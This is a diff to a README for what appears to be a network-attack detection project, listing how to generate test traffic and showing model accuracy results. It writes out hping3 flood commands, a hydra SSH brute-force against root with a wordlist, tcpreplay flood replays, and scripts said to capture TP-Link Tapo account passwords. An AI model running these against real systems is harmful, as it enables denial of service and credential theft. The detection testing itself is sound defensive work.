@@ -165,32 +165,51 @@ For example, to enable file integrity checks and machine learning-based attack d
 python app.py --filecheck True --mldetector SVM --train True
 ```
 
+To generate testing datasets and run corresponding flood:
+```sh
+sudo tshark -i lo -Y "(udp || tcp.flags.syn == 1 || icmp)" -T fields -e frame.time_epoch -e ip.src -e frame.len -e _ws.col.Protocol -e _ws.col.Info -E header=y -E separator=, -E quote=d -E occurrence=f > ~/Desktop/project/tcpdump_output.txt
+sudo hping3 --udp --flood --rand-source --destport 24 -c 500 127.0.0.1
+sudo hping3 --syn --flood --destport 80 -c 500 127.0.0.1
+sudo hping3 --icmp --flood -c 500 127.0.0.1
+```
+
 To run the Wi-Fi scanner, simply pass True to the --wifiscanner option. You will be prompted to enter the IP address range:
 ```sh
 python app.py --wifiscanner True
 ```
 
-
-## Cont'
-file check may need to combine with database
-database password encryption MD5
-
-
-<!-- brute force kali commands -->
-<!-- 1. sudo apt install openssh-client
-2. sudo service ssh start
-3. sudo hydra -l root -P /usr/share/wordlists/metasplpoit/unix_passwords.txt 127.0.0.1 ssh -t 4 -V -->
+To perform attacks for system account, run the command on Kali virtual machine:
+```sh
+sudo apt install openssh-client
+sudo service ssh start
+sudo hydra -l root -P /usr/share/wordlists/metasplpoit/unix_passwords.txt ip_address ssh -t 4 -V
+```
+<!-- sudo hydra -l root -P /usr/share/wordlists/metasplpoit/unix_passwords.txt 127.0.0.1 ssh -t 4 -V --> -->
 <!-- or 192.168.64.3 -->
 
-to map tcpdump data into tcpdump_output.txt file:
-cd Desktop/project
-sudo tshark -i lo -Y "(udp || tcp.flags.syn == 1 || icmp)" -T fields -e frame.time_epoch -e ip.src -e frame.len -e _ws.col.Protocol -e _ws.col.Info -E header=y -E separator=, -E quote=d -E occurrence=f > ~/Desktop/project/tcpdump_output.txt
+To perform network flooding towards certain devices, run the command on Ubuntu virtual machine:
+```sh
+sudo tcpreplay-edit --srcipmap=10.0.0.2:src_address --dstipmap=10.128.0.2:dest_address --enet-smac=src_mac --enet-dmac=des_mac --loop=10 -i enpos1 path_to_file/ip_fragmented.pcap
+sudo tcpreplay-edit --srcipmap=10.0.0.2:src_address --dstipmap=10.128.0.2:dest_address --enet-smac=src_mac --enet-dmac=des_mac --loop=10 -i enpos1 path_to_file/dns.pcap
+sudo tcpreplay-edit --srcipmap=10.0.0.2:src_address --dstipmap=10.128.0.2:dest_address --enet-smac=src_mac --enet-dmac=des_mac --loop=10 -i enpos1 path_to_file/SYN.pcap
+sudo tcpreplay-edit --srcipmap=10.0.0.2:src_address --dstipmap=10.128.0.2:dest_address --enet-smac=src_mac --enet-dmac=des_mac --loop=10 -i enpos1 path_to_file/udp_flood.pcap
+```
 
-UDP Flood:
-sudo hping3 --udp --flood --rand-source --destport 24 -c 500 127.0.0.1
+To get account password of IoT devices management application for TPLink Tapo, run the commands at the same time with separate terminals:
+```sh
+python UDPImpersonation.py
+python HTTPHandshakeImpersonation.py
+```
 
-SYN Flood:
-sudo hping3 --syn --flood --destport 80 -c 500 127.0.0.1
+## Results for flood detection
+| **Metrics (weighted average)** | **ACC** | **PRE** | **REC** | **F1-SCORE** |
+|:-----------------------------:|:-------:|:-------:|:-------:|:------------:|
+| **KNN**                       | 0.86    | 0.86    | 0.86    | 0.86         |
+| **SVM**                       | 0.69    | 0.66    | 0.70     | 0.66         |
+| **RF**                        | 0.87    | 0.88    | 0.88    | 0.88         |
+| **LR**                        | 0.64    | 0.78    | 0.77    | 0.78         |
 
-ICMP Flood:
-sudo hping3 --icmp --flood -c 500 127.0.0.1
+
+
+
+![alt text](cm.png)
